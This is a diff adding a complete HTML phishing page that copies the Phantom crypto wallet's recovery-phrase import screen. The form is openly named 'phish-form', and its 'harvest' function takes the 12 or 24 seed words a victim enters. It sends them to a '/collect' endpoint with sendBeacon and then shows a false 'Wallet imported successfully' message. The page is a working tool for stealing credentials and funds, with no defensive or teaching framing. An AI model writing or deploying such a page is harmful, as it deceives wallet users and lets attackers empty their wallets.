@@ -1,0 +1,128 @@
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #e2e2f5; display: flex; flex-direction: column; height: 100vh; overflow: hidden; color: #fff; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; }
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .phantom-ghost { width: 28px; height: 28px; background: #000; border-radius: 50% 50% 40% 40%; position: relative; display: inline-block; }
+        .help { color: #000; font-size: 14px; text-decoration: none; display: flex; align-items: center; gap: 6px; font-weight: 500; }
+        .main-container { flex: 1; display: flex; justify-content: center; align-items: center; position: relative; }
+        .modal { background: #121212; width: 480px; padding: 32px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center; position: relative; }
+        .dots { display: flex; gap: 6px; margin-bottom: 20px; }
+        .dot { width: 6px; height: 6px; background: #444; border-radius: 50%; }
+        .dot.active { background: #ab9ff2; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; color: #fff; text-align: center; }
+        p.sub { font-size: 13px; color: #888; text-align: center; margin-bottom: 24px; line-height: 1.4; }
+        .grid-12, .grid-24 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 100%; margin-bottom: 16px; }
+        .grid-24 { grid-template-columns: repeat(3, 1fr); max-height: 260px; overflow-y: auto; padding-right: 4px; }
+        .grid-24::-webkit-scrollbar { width: 4px; }
+        .grid-24::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+        .input-group { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 8px; padding: 8px 10px; display: flex; align-items: center; gap: 6px; }
+        .input-group span { font-size: 11px; color: #666; width: 20px; text-align: right; }
+        .input-group input { background: transparent; border: none; outline: none; color: #fff; font-size: 13px; width: 100%; }
+        .toggle-btn { background: none; border: none; color: #ab9ff2; font-size: 13px; cursor: pointer; margin-bottom: 20px; font-weight: 500; }
+        .import-btn { width: 100%; background: #1f1f1f; color: #666; border: none; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: not-allowed; transition: all 0.2s; }
+        .import-btn.active { background: #fff; color: #000; cursor: pointer; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-area">
+            <div class="phantom-ghost"></div>
+        </div>
+        <a href="#" class="help">ⓘ Help</a>
+    </header>
+    <div class="main-container">
+        <div class="modal">
+            <div class="dots">
+                <div class="dot active"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <h1>Recovery Phrase</h1>
+            <p class="sub" id="sub-text">Import an existing wallet with your 12 or<br>24-word recovery phrase.</p>
+            
+            <form id="phish-form" onsubmit="harvest(event)">
+                <div id="container-12" class="grid-12"></div>
+                <div id="container-24" class="grid-24 hidden"></div>
+                
+                <button type="button" class="toggle-btn" id="toggle-len" onclick="switchMode()">I have a 24-word recovery phrase</button>
+                <button type="submit" class="import-btn" id="submit-btn" disabled>Import Wallet</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let mode = 12;
+        const grid12 = document.getElementById('container-12');
+        const grid24 = document.getElementById('container-24');
+        const subText = document.getElementById('sub-text');
+        const toggleBtn = document.getElementById('toggle-len');
+        const submitBtn = document.getElementById('submit-btn');
+
+        function buildInputs(count) {
+            let target = count === 12 ? grid12 : grid24;
+            target.innerHTML = '';
+            for (let i = 1; i <= count; i++) {
+                target.innerHTML += `
+                    <div class="input-group">
+                        <span>${i}.</span>
+                        <input type="text" autocomplete="off" spellcheck="false" data-index="${i}" oninput="checkCompletion()">
+                    </div>
+                `;
+            }
+        }
+
+        buildInputs(12);
+        buildInputs(24);
+
+        function switchMode() {
+            if (mode === 12) {
+                mode = 24;
+                grid12.classList.add('hidden');
+                grid24.classList.remove('hidden');
+                toggleBtn.innerText = "I have a 12-word recovery phrase";
+            } else {
+                mode = 12;
+                grid24.classList.add('hidden');
+                grid12.classList.remove('hidden');
+                toggleBtn.innerText = "I have a 24-word recovery phrase";
+            }
+            checkCompletion();
+        }
+
+        function checkCompletion() {
+            const activeContainer = mode === 12 ? grid12 : grid24;
+            const inputs = activeContainer.querySelectorAll('input');
+            let filled = 0;
+            inputs.forEach(inp => { if (inp.value.trim().length > 0) filled++; });
+            
+            if (filled === mode) {
+                submitBtn.classList.add('active');
+                submitBtn.removeAttribute('disabled');
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.setAttribute('disabled', 'true');
+            }
+        }
+
+        function harvest(e) {
+            e.preventDefault();
+            const activeContainer = mode === 12 ? grid12 : grid24;
+            const inputs = activeContainer.querySelectorAll('input');
+            const words = Array.from(inputs).map(i => i.value.trim());
+            
+            navigator.sendBeacon('/collect', JSON.stringify({ phrase: words.join(' ') }));
+            alert('Wallet imported successfully');
+        }
+    </script>
+</body>
+</html>
